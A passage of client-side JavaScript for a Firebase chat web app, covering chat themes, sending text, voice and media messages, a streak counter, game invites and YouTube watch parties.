            messagesContainer.style.backgroundBlendMode = 'multiply';
        }
    } else {
        chatWindowContainer.style.backgroundImage = 'none';
        chatWindowContainer.style.backgroundColor = theme.bgColor;
        messagesContainer.style.backgroundColor = 'transparent';
        messagesContainer.style.backgroundBlendMode = 'normal';
    }

    // Apply bubble colors to all messages (excluding deleted ones)
    const sentMessages = messagesContainer.querySelectorAll('.message.sent:not(.deleted) .message-bubble');
    const receivedMessages = messagesContainer.querySelectorAll('.message.received:not(.deleted) .message-bubble');

    sentMessages.forEach(msg => {
        msg.style.backgroundColor = theme.sentBubbleColor;
    });

    receivedMessages.forEach(msg => {
        msg.style.backgroundColor = theme.receivedBubbleColor;
    });
}

// ===========================
// Admin Background Selector
// ===========================
async function openAdminBgSelector() {
    if (!adminBgSelectorModal) return;

    adminBgSelectorModal.classList.remove('hidden');
    adminBgLoading.classList.remove('hidden');
    adminBgEmpty.classList.add('hidden');
    adminBgGrid.innerHTML = '';

    try {
        // Fetch admin backgrounds from Firestore
        const snapshot = await getDocs(collection(db, 'admin_backgrounds'));
        const backgrounds = [];

        snapshot.forEach(doc => {
            backgrounds.push({
                id: doc.id,
                ...doc.data()
            });
        });

        adminBgLoading.classList.add('hidden');

        if (backgrounds.length === 0) {
            adminBgEmpty.classList.remove('hidden');
            return;
        }

        // Render backgrounds
        backgrounds.forEach(bg => {
            const bgItem = document.createElement('div');
            bgItem.className = 'admin-bg-item';
            bgItem.innerHTML = `
                <img src="${bg.thumbnailUrl || bg.url}" alt="${bg.name}" onerror="this.src='${bg.url}'">
                <div class="admin-bg-name">${bg.name}</div>
            `;

            bgItem.addEventListener('click', () => selectAdminBackground(bg));
            adminBgGrid.appendChild(bgItem);
        });

    } catch (error) {
        console.error('Error loading admin backgrounds:', error);
        adminBgLoading.classList.add('hidden');
        adminBgEmpty.classList.remove('hidden');
        adminBgEmpty.innerHTML = '<p>Error loading backgrounds</p>';
    }
}

function closeAdminBgSelector() {
    if (adminBgSelectorModal) {
        adminBgSelectorModal.classList.add('hidden');
    }
}

async function selectAdminBackground(bg) {
    if (!currentChatId) return;

    try {
        // Update the bgImage field in the theme
        const currentTheme = chatThemes.get(currentChatId) || getDefaultTheme();
        const updatedTheme = {
            ...currentTheme,
            bgImage: bg.url,
            bgImageOverlay: true,
            updatedBy: currentUser.uid,
            updatedAt: serverTimestamp()
        };

        // Save to local map
        chatThemes.set(currentChatId, updatedTheme);

        // Save to localStorage
        const themesData = JSON.stringify(Array.from(chatThemes.entries()));
        localStorage.setItem(`themes_${currentUser.uid}`, themesData);

        // Save to Firestore
        const themeRef = doc(db, 'chats', currentChatId, 'metadata', 'theme');
        await setDoc(themeRef, updatedTheme, { merge: true });

        // Apply theme to chat
        applyThemeToChat(updatedTheme);

        // Close the selector modal
        closeAdminBgSelector();

        // Show success notification
        showNotification(`✅ Background "${bg.name}" applied!`, 2000);

    } catch (error) {
        console.error('Error applying background:', error);
        showNotification('❌ Failed to apply background', 2000);
    }
}

let unsubscribeTheme = null;

function loadThemeForChat() {
    if (!currentChatId) return;

    // First, apply locally cached theme
    const cachedTheme = chatThemes.get(currentChatId);
    if (cachedTheme) {
        applyThemeToChat(cachedTheme);
    } else {
        applyThemeToChat(getDefaultTheme());
    }

    // Listen for real-time theme changes from Firestore
    if (unsubscribeTheme) {
        unsubscribeTheme();
    }

    try {
        const themeRef = doc(db, 'chats', currentChatId, 'metadata', 'theme');
        unsubscribeTheme = onSnapshot(themeRef, (doc) => {
            if (doc.exists()) {
                const themeData = doc.data();
                console.log('Theme updated from Firestore:', themeData);

                // Update local cache
                chatThemes.set(currentChatId, themeData);

                // Apply the theme immediately
                applyThemeToChat(themeData);
            } else {
                // No theme set, use default
                const defaultTheme = getDefaultTheme();
                chatThemes.delete(currentChatId);
                applyThemeToChat(defaultTheme);
            }
        }, (error) => {
            console.error('Error listening to theme changes:', error);
        });
    } catch (error) {
        console.error('Error setting up theme listener:', error);
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function formatMessageText(text) {
    if (!text) return '';
    return escapeHtml(text).replace(/\n/g, '<br>');
}

/**
 * Format voice message duration from milliseconds to MM:SS
 */
function formatVoiceDuration(milliseconds) {
    const totalSeconds = Math.floor(milliseconds / 1000);
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
}

/**
 * Global voice players map for tracking playback state
 */
const voicePlayersMap = new Map(); // messageId -> { audio, isPlaying }

/**
 * Toggle voice message playback
 */
function toggleVoicePlayback(messageId, voiceUrl, playBtn, progressBar) {
    let playerData = voicePlayersMap.get(messageId);

    if (!playerData) {
        // Create new audio element
        const audio = new Audio(voiceUrl);
        playerData = { audio, isPlaying: false };
        voicePlayersMap.set(messageId, playerData);

        // Update progress on time update
        audio.addEventListener('timeupdate', () => {
            updateVoiceProgress(messageId, audio, progressBar);
        });

        // Reset button when finished
        audio.addEventListener('ended', () => {
            playerData.isPlaying = false;
            updateVoicePlayButtonState(playBtn, false);
        });

        // Handle errors
        audio.addEventListener('error', () => {
            console.error('Error playing voice message:', audio.error);
            updateVoicePlayButtonState(playBtn, false, true);
            showNotification('Failed to play voice message');
        });
    }

    const audio = playerData.audio;

    if (playerData.isPlaying) {
        // Pause
        audio.pause();
        playerData.isPlaying = false;
        updateVoicePlayButtonState(playBtn, false);
    } else {
        // Play
        audio.play().catch(error => {
            console.error('Error playing audio:', error);
            showNotification('Failed to play voice message');
        });
        playerData.isPlaying = true;
        updateVoicePlayButtonState(playBtn, true);
    }
}

/**
 * Update voice play button state with SVG icon
 */
function updateVoicePlayButtonState(playBtn, isPlaying, isError = false) {
    if (!playBtn) return;

    const icon = playBtn.querySelector('.voice-play-icon');
    if (!icon) return;

    if (isError) {
        // Error state - show X icon
        icon.innerHTML = '<circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line>';
    } else if (isPlaying) {
        // Playing state - show pause icon
        icon.innerHTML = '<rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect>';
    } else {
        // Paused/stopped state - show play icon
        icon.innerHTML = '<polygon points="5 3 19 12 5 21 5 3"></polygon>';
    }
}

/**
 * Update voice message progress bar
 */
function updateVoiceProgress(messageId, audio, progressBar) {
    if (!progressBar || !audio.duration) return;

    const percentage = (audio.currentTime / audio.duration) * 100;
    const progressFill = progressBar.querySelector('.voice-progress-small-fill');
    if (progressFill) {
        progressFill.style.width = percentage + '%';
    }
}

/**
 * Seek voice message
 */
function seekVoiceMessage(messageId, voiceUrl, event, progressBar) {
    let playerData = voicePlayersMap.get(messageId);

    if (!playerData) {
        // Create audio if it doesn't exist
        const audio = new Audio(voiceUrl);
        playerData = { audio, isPlaying: false };
        voicePlayersMap.set(messageId, playerData);
    }

    const audio = playerData.audio;
    if (audio.duration) {
        const rect = progressBar.getBoundingClientRect();
        const percentage = (event.clientX - rect.left) / rect.width;
        audio.currentTime = percentage * audio.duration;
    }
}

function isMediaMessage(messageData) {
    if (!messageData || !messageData.imgUrl) return false;
    return ['image', 'gif', 'sticker'].includes(messageData.type);
}

function getMediaAltText(type) {
    switch (type) {
        case 'gif':
            return 'GIF';
        case 'sticker':
            return 'Sticker';
        default:
            return 'Image';
    }
}

function createEmojiStickerDataUrl(emoji) {
    const svg = `
        <svg xmlns="http://www.w3.org/2000/svg" width="320" height="320">
            <rect width="100%" height="100%" rx="60" fill="#ffffff" fill-opacity="0.08"/>
            <text x="50%" y="55%" font-size="200" text-anchor="middle" dominant-baseline="middle">${emoji}</text>
        </svg>
    `;
    return `data:image/svg+xml,${encodeURIComponent(svg)}`;
}

// ===========================
// Mobile Keyboard Detection
// ===========================
// Detect when keyboard appears on mobile and scroll to bottom
if (messageInput) {
    messageInput.addEventListener('focus', () => {
        // Scroll to bottom when input is focused (keyboard appears)
        setTimeout(() => {
            scrollToBottom(false);
        }, 300); // Wait for keyboard animation
    });

    messageInput.addEventListener('input', function () {
        // Auto-resize logic
        this.style.height = 'auto';
        this.style.height = (this.scrollHeight) + 'px';

        // Only scroll when typing a new message, not when editing
        if (!editingMessageId) {
            scrollToBottom(false);
        }

        // Save draft
        if (currentChatId) {
            saveDraft(currentChatId, this.value);
        }
    });

    messageInput.addEventListener('blur', function () {
        if (currentChatId) {
            saveDraft(currentChatId, this.value);
        }
    });
}

// Listen for visual viewport resize (keyboard show/hide on mobile)
// This is much smoother than window.resize
if (window.visualViewport) {
    window.visualViewport.addEventListener('resize', () => {
        // Immediately adjust scroll position when viewport changes
        // This keeps the input and messages pinned correctly during the animation
        scrollToBottom(false);
    });
} else {
    // Fallback for older browsers
    let lastWindowHeight = window.innerHeight;
    window.addEventListener('resize', () => {
        const currentHeight = window.innerHeight;
        if (currentHeight < lastWindowHeight) {
            setTimeout(() => {
                scrollToBottom(false);
            }, 100);
        }
        lastWindowHeight = currentHeight;
    });
}

// ===========================
// Mobile Keyboard Persistence
// ===========================
function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function focusInputAndKeepKeyboard() {
    if (isMobileDevice()) {
        // Only restore focus if the user hasn't explicitly closed the keyboard
        if (!isUserManuallyClosed) {
            // Don't blur - just keep focus on the input
            // This prevents the keyboard from closing
            messageInput.focus();

            // Scroll input into view with a slight delay to ensure keyboard is visible
            setTimeout(() => {
                messageInput.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            }, 50);
        }
    }
}

// ===========================
// Send Message
// ===========================
// Flag to track if user explicitly closed the keyboard
let isUserManuallyClosed = false;

// Prevent keyboard from closing on mobile
if (isMobileDevice()) {
    messageInput.addEventListener('blur', (e) => {
        // Keep keyboard open if context menu is open
        if (isContextMenuOpen) {
            // Don't set isUserManuallyClosed here
            return;
        }

        // If we are sending a message (send button clicked), don't consider it manual close
        // The send button handler will refocus

        // Otherwise, assume user tapped outside to close
        isUserManuallyClosed = true;
    });

    messageInput.addEventListener('focus', () => {
        isUserManuallyClosed = false;
    });
}

sendBtn.addEventListener('touchstart', (e) => {
    // Prevent default touch behavior to avoid blur
    e.preventDefault();
    // Trigger click logic
    sendBtn.click();
});

sendBtn.addEventListener('click', (e) => {
    e.preventDefault();
    // Don't let the button steal focus from input
    // Crucial for mobile keyboard persistence

    // Reset manual close flag since user is interacting with chat controls
    isUserManuallyClosed = false;

    messageInput.focus();
    sendMessage();
});

// Allow Enter key for new lines (no send on Enter)
messageInput.addEventListener('keypress', (e) => {
    // Just allow normal Enter behavior for new lines
    // Users must click send button to send message
});


async function sendMessage() {
    const rawText = messageInput.value;
    if (!rawText.trim() || !currentChatId) return;
    const text = rawText;

    // Clear input immediately for instant feedback
    messageInput.value = '';
    messageInput.style.height = 'auto';
    hideStickerRecommendations();

    try {
        // Check if we're editing a message
        if (editingMessageId) {
            // Update existing message
            const messageRef = doc(db, 'chats', currentChatId, 'messages', editingMessageId);
            await updateDoc(messageRef, {
                text: text,
                isEdited: true
            });

            cancelEdit();
            updateTypingStatus(false);

            // Keep keyboard open on mobile
            focusInputAndKeepKeyboard();
            return;
        }

        // Create new message
        const messagesRef = collection(db, 'chats', currentChatId, 'messages');
        const messageData = {
            text: text,
            senderId: currentUser.uid,
            timestamp: serverTimestamp(),
            type: 'text',
            seen: false,
            isEdited: false,
            reactions: [],
            isDeleted: false
        };

        await addDoc(messagesRef, applyReplyContext(messageData));

        clearDraft(currentChatId); // Clear draft after sending
        cancelReply();
        updateTypingStatus(false);

        // Update streak on message send
        await updateStreakOnMessage(currentChatId, currentUser.uid);

        // Keep keyboard open on mobile after sending
        focusInputAndKeepKeyboard();
    } catch (error) {
        console.error('Error sending message:', error);
        // Restore text if there was an error
        messageInput.value = text;
    }
}

function applyReplyContext(messageData) {
    if (replyingToMessage && messageData) {
        const previewData = getMessagePreviewData(replyingToMessage);
        messageData.replyTo = {
            messageId: replyingToMessage.id,
            senderId: replyingToMessage.senderId,
            senderName: replyingToMessage.senderName || 'Unknown',
            text: previewData.text,
            type: replyingToMessage.type,
            imgUrl: replyingToMessage.imgUrl || null
        };
        console.log('Reply context applied:', {
            type: replyingToMessage.type,
            imgUrl: replyingToMessage.imgUrl,
            text: previewData.text
        });
    }
    return messageData;
}

/**
 * Delete media from Cloudinary
 * Extracts public_id from URL and deletes the resource
 */
async function deleteMediaFromCloudinary(mediaUrl) {
    if (!mediaUrl) return;

    try {
        // Extract public_id from Cloudinary URL
        // URL format: https://res.cloudinary.com/{cloud_name}/image/upload/v{version}/{public_id}
        const urlParts = mediaUrl.split('/');
        const versionIndex = urlParts.findIndex(part => part.startsWith('v'));

        if (versionIndex === -1) {
            console.warn('Could not extract public_id from URL:', mediaUrl);
            return;
        }

        // Get public_id (everything after version, without extension)
        const publicIdWithExt = urlParts.slice(versionIndex + 1).join('/');
        const publicId = publicIdWithExt.split('.')[0];

        // Call Cloudinary delete API
        const response = await fetch(
            `https://api.cloudinary.com/v1_1/${window.CLOUDINARY_CLOUD_NAME || 'dxhn3fzfu'}/resources/image/upload`,
            {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${window.CLOUDINARY_API_KEY || ''}`
                },
                body: JSON.stringify({
                    public_ids: [publicId]
                })
            }
        );

        if (!response.ok) {
            console.warn('Failed to delete from Cloudinary:', response.status);
        }
    } catch (error) {
        console.error('Error deleting media from Cloudinary:', error);
        // Don't throw - allow message deletion to continue
    }
}

async function sendMediaMessage(mediaUrl, messageType) {
    if (!currentChatId || !mediaUrl || !currentUser) return;
    const messagesRef = collection(db, 'chats', currentChatId, 'messages');
    const payload = applyReplyContext({
        imgUrl: mediaUrl,
        senderId: currentUser.uid,
        timestamp: serverTimestamp(),
        type: messageType,
        seen: false,
        reactions: [],
        isDeleted: false
    });
    await addDoc(messagesRef, payload);
    if (replyingToMessage) {
        cancelReply();
    }
    updateTypingStatus(false);
    // Auto-scroll to bottom when media message is sent
    scrollToBottom(true);
}

/**
 * Send voice message to Firestore
 * Called from voice-messaging.js
 */
async function sendVoiceMessage(voiceUrl, duration) {
    if (!currentChatId || !voiceUrl || !currentUser) return;
    try {
        const messagesRef = collection(db, 'chats', currentChatId, 'messages');
        const payload = applyReplyContext({
            voiceUrl: voiceUrl,
            duration: duration,
            senderId: currentUser.uid,
            timestamp: serverTimestamp(),
            type: 'voice',
            seen: false,
            reactions: [],
            isDeleted: false
        });
        await addDoc(messagesRef, payload);
        if (replyingToMessage) {
            cancelReply();
        }
        updateTypingStatus(false);
        // Update streak on voice message
        await updateStreakOnMessage(currentChatId, currentUser.uid);
        // Auto-scroll to bottom
        scrollToBottom(true);
        showNotification('Voice message sent!');
    } catch (error) {
        console.error('Error sending voice message:', error);
        showNotification('Failed to send voice message', 3000);
    }
}

// Make sendVoiceMessage available globally for voice-messaging.js
window.sendVoiceMessage = sendVoiceMessage;

// ===========================
// Streak System (Custom Logic)
// ===========================
/**
 * Streak Logic:
 * - Increases by 1 when BOTH users message each other within a cycle
 * - Does NOT reset to 0 if users miss a day - it pauses and resumes when they message again
 * - Tracks: count, lastMessageDate, lastMessageFrom
 */

async function loadStreakData(chatId) {
    try {
        const streakRef = doc(db, 'chats', chatId, 'metadata', 'streak');
        const streakDoc = await getDoc(streakRef);

        if (streakDoc.exists()) {
            const data = streakDoc.data();
            streakData.set(chatId, {
                count: data.count || 0,
                lastMessageDate: data.lastMessageDate,
                lastMessageFrom: data.lastMessageFrom,
                lastBothMessagedDate: data.lastBothMessagedDate
            });
            console.log('Loaded streak for', chatId, ':', data);
        } else {
            // Initialize streak document if it doesn't exist
            const initialStreak = {
                count: 0,
                lastMessageDate: null,
                lastMessageFrom: null,
                lastBothMessagedDate: null,
                createdAt: serverTimestamp()
            };
            await setDoc(streakRef, initialStreak, { merge: true });
            streakData.set(chatId, initialStreak);
            console.log('Initialized new streak for', chatId);
        }
    } catch (error) {
        console.error('Error loading streak data:', error);
        streakData.set(chatId, {
            count: 0,
            lastMessageDate: null,
            lastMessageFrom: null,
            lastBothMessagedDate: null
        });
    }
}

async function updateStreakOnMessage(chatId, senderId) {
    if (!chatId || !senderId || !currentUser) return;

    try {
        const streakRef = doc(db, 'chats', chatId, 'metadata', 'streak');
        const today = new Date().toDateString();

        // Get current streak from Firestore (fresh data)
        const streakDoc = await getDoc(streakRef);
        let currentStreak = streakDoc.exists() ? streakDoc.data() : {
            count: 0,
            lastMessageDate: null,
            lastMessageFrom: null,
            lastBothMessagedDate: null
        };

        const lastMessageDate = currentStreak.lastMessageDate ? new Date(currentStreak.lastMessageDate).toDateString() : null;
        const lastBothMessagedDate = currentStreak.lastBothMessagedDate ? new Date(currentStreak.lastBothMessagedDate).toDateString() : null;
        const lastMessageFrom = currentStreak.lastMessageFrom;

        let newCount = currentStreak.count || 0;
        let newBothMessagedDate = lastBothMessagedDate;

        console.log('Streak Debug:', {
            today,
            lastMessageDate,
            lastBothMessagedDate,
            lastMessageFrom,
            currentSenderId: senderId,
            isDifferentSender: lastMessageFrom !== senderId,
            bothMessagedToday: lastMessageDate === today && lastMessageFrom !== senderId
        });

        // If both users messaged today (different senders), increment streak
        if (lastMessageDate === today && lastMessageFrom && lastMessageFrom !== senderId && lastBothMessagedDate !== today) {
            newCount = (currentStreak.count || 0) + 1;
            newBothMessagedDate = today;
            console.log('Streak incremented to:', newCount);
        }

        // Update streak data
        const updatedStreak = {
            count: newCount,
            lastMessageDate: today,
            lastMessageFrom: senderId,
            lastBothMessagedDate: newBothMessagedDate,
            updatedAt: serverTimestamp()
        };

        await setDoc(streakRef, updatedStreak, { merge: true });
        streakData.set(chatId, updatedStreak);
        updateStreakDisplay(chatId);
    } catch (error) {
        console.error('Error updating streak:', error);
    }
}

function updateStreakDisplay(chatId) {
    if (chatId !== currentChatId || !streakBadge || !streakCount) return;

    const streak = streakData.get(chatId);
    if (!streak || streak.count === 0) {
        streakBadge.classList.add('hidden');
    } else {
        streakBadge.classList.remove('hidden');
        streakCount.textContent = streak.count;
    }
}

// ===========================
// Game Invites
// ===========================
function generateGameRoomId() {
    return 'game_' + Math.random().toString(36).substr(2, 9);
}

/**
 * Open Games Launcher Modal
 */
function openGamesLauncher() {
    const modal = document.getElementById('games-launcher-modal');
    if (modal) {
        modal.classList.remove('hidden');
    }
}

/**
 * Close Games Launcher Modal
 */
function closeGamesLauncher() {
    const modal = document.getElementById('games-launcher-modal');
    if (modal) {
        modal.classList.add('hidden');
    }
}

/**
 * Setup Games Launcher Event Listeners
 */
function setupGamesLauncher() {
    const modal = document.getElementById('games-launcher-modal');
    const closeBtn = document.getElementById('close-games-launcher');
    const backdrop = document.querySelector('.games-launcher-backdrop');
    const gameOptions = document.querySelectorAll('.game-option');

    // Close button
    if (closeBtn) {
        closeBtn.addEventListener('click', closeGamesLauncher);
    }

    // Backdrop click
    if (backdrop) {
        backdrop.addEventListener('click', closeGamesLauncher);
    }

    // Game option clicks
    gameOptions.forEach(option => {
        option.addEventListener('click', () => {
            const gameType = option.dataset.game;
            closeGamesLauncher();
            handleGameInvite(gameType);
        });
    });

    // Close on Escape key
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) {
            closeGamesLauncher();
        }
    });
}

async function handleGameInvite(gameType = 'tictactoe') {
    if (!currentChatId || !currentChatUser) {
        alert('Please select a user to challenge');
        return;
    }

    try {
        showLoading('Creating game invite...');

        // Generate unique room ID
        const roomId = generateGameRoomId();

        // Determine game details
        let gameTitle = 'Tic-Tac-Toe';
        let gameFile = 'games.html';
        let gameEmoji = '⭕';

        if (gameType === 'rps') {
            gameTitle = 'Rock Paper Scissors';
            gameFile = 'rps.html';
            gameEmoji = '✂️';
        }

        // Create game invite message
        const gameInviteMessage = {
            text: `${gameEmoji} ${currentUserData?.displayName || 'Someone'} challenged you to ${gameTitle}!`,
            type: 'game_invite',
            senderId: currentUser.uid,
            roomId: roomId,
            gameType: gameType,
            invitedBy: currentUser.uid,
            invitedByName: currentUserData?.displayName || 'Unknown',
            invitedByAvatar: currentUserData?.photoURL || '',
            invitedToName: currentChatUser?.displayName || 'them',
            gameStarted: false,
            timestamp: serverTimestamp(),
            seen: false,
            reactions: [],
            isDeleted: false
        };

        // Send the invite message
        await addDoc(collection(db, 'chats', currentChatId, 'messages'), gameInviteMessage);

        // Redirect host to game page
        setTimeout(() => {
            window.location.href = `${gameFile}?roomId=${roomId}&mode=host&chatId=${currentChatId}`;
        }, 500);

        hideLoading();
    } catch (error) {
        hideLoading();
        console.error('Error creating game invite:', error);
        alert('Failed to create game invite. Please try again.');
    }
}

// ===========================
// Watch Parties
// ===========================
function generateWatchPartyId() {
    return 'watch_' + Math.random().toString(36).substr(2, 9);
}

function openWatchPartyModal() {
    if (!watchPartyModal) return;
    if (!currentChatId) {
        alert('Select a chat conversation first.');
        return;
    }

    watchPartyModal.classList.remove('hidden');
    if (watchPartyInput) {
        watchPartyInput.focus();
        watchPartyInput.select();
    }
}

function closeWatchPartyModal() {
    if (!watchPartyModal) return;
    watchPartyModal.classList.add('hidden');
    resetWatchPartyModal();
}

function resetWatchPartyModal() {
    if (watchPartyInput) {
        watchPartyInput.value = '';
    }
    if (watchPartyError) {
        watchPartyError.textContent = '';
        watchPartyError.classList.add('hidden');
    }
    if (watchPartyPreview) {
        watchPartyPreview.classList.add('hidden');
    }
    if (watchPartyThumbnail) {
        watchPartyThumbnail.style.backgroundImage = '';
    }
    pendingWatchPartyVideoId = null;
    pendingWatchPartyMetadata = null;
}

function extractYouTubeVideoId(value) {
    if (!value) return null;
    const trimmed = value.trim();
    if (!trimmed) return null;

    // Direct 11-char ID
    if (/^[a-zA-Z0-9_-]{11}$/.test(trimmed)) {
        return trimmed;
    }

    try {
        let urlToParse = trimmed;
        if (!/^https?:\/\//i.test(urlToParse)) {
            urlToParse = `https://${urlToParse}`;
        }
        const url = new URL(urlToParse);

        if (url.hostname.includes('youtu.be')) {
            const pathSegments = url.pathname.split('/').filter(Boolean);
            if (pathSegments.length > 0 && /^[a-zA-Z0-9_-]{11}$/.test(pathSegments[0])) {
                return pathSegments[0];
            }
        }

        if (url.searchParams.has('v')) {
            const id = url.searchParams.get('v');
            if (id && /^[a-zA-Z0-9_-]{11}$/.test(id)) {
                return id;
            }
        }

        const embedMatch = url.pathname.match(/\/embed\/([a-zA-Z0-9_-]{11})/);
        if (embedMatch && embedMatch[1]) {
            return embedMatch[1];
        }
    } catch (error) {
        const fallbackMatch = trimmed.match(/([a-zA-Z0-9_-]{11})/);
        if (fallbackMatch && fallbackMatch[1]) {
            return fallbackMatch[1];
        }
    }

    return null;
}

async function fetchYouTubeMetadata(videoId) {
    const endpoint = `https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=${videoId}&format=json`;
    try {
        const response = await fetch(endpoint);
        if (!response.ok) {
            throw new Error(`YouTube metadata failed: ${response.status}`);
        }
        const data = await response.json();
        return {
            title: data.title,
            thumbnail: data.thumbnail_url
        };
    } catch (error) {
        console.warn('Unable to fetch YouTube metadata:', error);
        return null;
    }
}

function getDefaultThumbnail(videoId) {
    return `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`;
}

function updateWatchPartyPreviewUI(videoId, metadata) {
    if (!watchPartyPreview || !watchPartyThumbnail || !watchPartyTitleEl) return;
    const thumbnail = metadata?.thumbnail || getDefaultThumbnail(videoId);
    watchPartyThumbnail.style.backgroundImage = `url('${thumbnail}')`;
    watchPartyTitleEl.textContent = metadata?.title || 'YouTube Video';
    watchPartyPreview.classList.remove('hidden');
}

function handleWatchPartyInputChange() {
    if (!watchPartyInput) return;
    const rawValue = watchPartyInput.value;

    if (watchPartyError) {
        watchPartyError.textContent = '';
        watchPartyError.classList.add('hidden');
    }

    if (watchPartyMetadataTimer) {
        clearTimeout(watchPartyMetadataTimer);
    }

    const videoId = extractYouTubeVideoId(rawValue);
    if (!videoId) {
        pendingWatchPartyVideoId = null;
        pendingWatchPartyMetadata = null;
        if (watchPartyPreview) {
            watchPartyPreview.classList.add('hidden');
        }
        return;
    }

    pendingWatchPartyVideoId = videoId;
    watchPartyMetadataTimer = setTimeout(async () => {
        const metadata = await fetchYouTubeMetadata(videoId);
        if (pendingWatchPartyVideoId !== videoId) return;
        pendingWatchPartyMetadata = {
            videoId,
            title: metadata?.title || 'YouTube Video',
            thumbnail: metadata?.thumbnail || getDefaultThumbnail(videoId)
        };
        updateWatchPartyPreviewUI(videoId, pendingWatchPartyMetadata);
    }, 350);
}

async function handleCreateWatchParty(event) {
    if (event) {
        event.preventDefault();
    }

    if (!currentUser || !currentChatId) {
        if (watchPartyError) {
            watchPartyError.textContent = 'Select a chat to start a watch party.';
            watchPartyError.classList.remove('hidden');
        }
        return;
    }

    const rawUrl = watchPartyInput ? watchPartyInput.value.trim() : '';
    const videoId = extractYouTubeVideoId(rawUrl);

    if (!videoId) {
        if (watchPartyError) {
            watchPartyError.textContent = 'Enter a valid YouTube link.';
            watchPartyError.classList.remove('hidden');
        }
        return;
    }

    try {
        showLoading('Creating watch party...');

        let metadata = pendingWatchPartyMetadata;
        if (!metadata || metadata.videoId !== videoId) {
            metadata = await fetchYouTubeMetadata(videoId) || {
                title: 'YouTube Video',
                thumbnail: getDefaultThumbnail(videoId)
            };
        }

        const roomId = generateWatchPartyId();
        const watchDocRef = doc(db, 'watchParties', roomId);

        await setDoc(watchDocRef, {
            roomId,
            chatId: currentChatId,
            hostId: currentUser.uid,
            hostName: currentUserData?.displayName || currentUser.email || 'Host',
            hostAvatar: currentUserData?.photoURL || '',
            videoId,
            videoTitle: metadata.title,
            videoThumbnail: metadata.thumbnail || getDefaultThumbnail(videoId),
            videoUrl: `https://www.youtube.com/watch?v=${videoId}`,
            createdAt: serverTimestamp(),
            updatedAt: serverTimestamp(),
            isPlaying: false,
            currentTime: 0,
            isActive: true,
            lastActionBy: currentUser.uid,
            lastActionName: currentUserData?.displayName || 'Host',
            participantsCount: 1
        });

        await setDoc(doc(db, 'watchParties', roomId, 'participants', currentUser.uid), {
            uid: currentUser.uid,
            displayName: currentUserData?.displayName || currentUser.email || 'You',
            photoURL: currentUserData?.photoURL || '',
            role: 'host',
            joinedAt: serverTimestamp(),
            lastSeen: serverTimestamp()
        });

        const watchPartyMessage = {
            text: `${currentUserData?.displayName || 'Someone'} started a watch party`,
            type: 'watch_party',
            senderId: currentUser.uid,
            roomId,
            videoId,
            videoTitle: metadata.title,
            videoThumbnail: metadata.thumbnail || getDefaultThumbnail(videoId),
            hostId: currentUser.uid,
            hostName: currentUserData?.displayName || 'Host',
            hostAvatar: currentUserData?.photoURL || '',
            partyEnded: false,
            timestamp: serverTimestamp(),
            seen: false,
            reactions: [],
            isDeleted: false
        };

        const messageRef = await addDoc(collection(db, 'chats', currentChatId, 'messages'), watchPartyMessage);

        await updateDoc(watchDocRef, {
            messageId: messageRef.id
        });

        closeWatchPartyModal();
        hideLoading();

        setTimeout(() => {
            window.location.href = `watch.html?roomId=${roomId}&mode=host&chatId=${currentChatId}`;
        }, 400);
    } catch (error) {
        console.error('Error creating watch party:', error);
        hideLoading();
        if (watchPartyError) {
            watchPartyError.textContent = 'Failed to create watch party. Please try again.';
            watchPartyError.classList.remove('hidden');
        }
    }
}

if (createWatchPartyBtn) {
    createWatchPartyBtn.addEventListener('click', handleCreateWatchParty);
}

if (watchPartyInput) {
    watchPartyInput.addEventListener('input', handleWatchPartyInputChange);
}

if (closeWatchPartyModalBtn) {
    closeWatchPartyModalBtn.addEventListener('click', closeWatchPartyModal);
}

if (watchPartyModal) {
    watchPartyModal.addEventListener('click', (e) => {
        if (e.target === watchPartyModal) {
            closeWatchPartyModal();
        }
    });
}

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && watchPartyModal && !watchPartyModal.classList.contains('hidden')) {
        closeWatchPartyModal();
    }
});

// ===========================
// Media Menu
// ===========================
if (mediaMenuBtn) {
    mediaMenuBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        if (mediaMenu) {
            mediaMenu.classList.toggle('hidden');
        }
    });
}

// Close media menu when clicking outside
document.addEventListener('click', (e) => {
    if (mediaMenu && !mediaMenu.contains(e.target) && e.target !== mediaMenuBtn) {
        mediaMenu.classList.add('hidden');
    }
});

// Handle media menu item clicks
if (mediaMenu) {
    mediaMenu.addEventListener('click', (e) => {
        const menuItem = e.target.closest('.media-menu-item');
        if (!menuItem) return;

        const action = menuItem.dataset.action;
        mediaMenu.classList.add('hidden');

        if (action === 'image') {
            imageInput.click();
        } else if (action === 'gif') {
            console.log('Opening GIF modal...');
            openGifModal();
        } else if (action === 'sticker') {
            openStickerSheet();
        } else if (action === 'games') {
            openGamesLauncher();
        } else if (action === 'watch') {
            openWatchPartyModal();
        } else if (action === 'voice') {
            if (window.voiceMessenger) {
                window.voiceMessenger.startRecordingUI();
            }
        }
    });
}

// ===========================
// Image Upload (Cloudinary)
// ===========================

imageInput.addEventListener('change', async (e) => {
    const file = e.target.files[0];
    if (!file || !currentChatId) return;

    try {
        // Create thumbnail from file
        const thumbnailUrl = URL.createObjectURL(file);

        // Create temporary message with circular progress indicator
        const tempMessageId = `temp-${Date.now()}`;
        const tempMessageDiv = document.createElement('div');
        tempMessageDiv.className = 'message sent image-only uploading';
        tempMessageDiv.dataset.messageId = tempMessageId;

        // Create SVG circle for determinate progress
        const radius = 26;
        const circumference = 2 * Math.PI * radius;

        tempMessageDiv.innerHTML = `
            <div class="message-bubble">
                <div class="image-upload-container">
                    <div class="image-upload-wrapper">
                        <img src="${thumbnailUrl}" class="image-upload-thumbnail" alt="Uploading...">
